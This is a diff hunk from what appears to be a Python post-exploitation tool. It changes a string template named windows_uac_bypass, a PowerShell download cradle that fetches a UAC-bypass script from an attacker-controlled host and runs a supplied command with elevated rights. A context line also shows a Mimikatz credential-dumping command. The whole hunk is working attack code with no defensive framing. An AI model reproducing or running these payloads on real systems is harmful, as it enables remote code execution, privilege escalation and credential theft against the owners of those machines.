@@ -103,8 +103,8 @@ class SHELLCODE(object):
         "Invoke-Mimikatz -DumpCreds")
 
     windows_uac_bypass = (
-        "IEX (New-Object Net.WebClient).DownloadString(\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\");"
-        "Invoke-SilentCleanUpBypass -Command \"%s && REM\"")
+        "IEX (New-Object Net.WebClient).DownloadString(\\\"http://%s:%s/Invoke-SilentCleanUpBypass.ps1\\\");"
+        "Invoke-SilentCleanUpBypass -Command \\\"powershell.exe -c %s\\\"")
 
 
     injectwindows = """
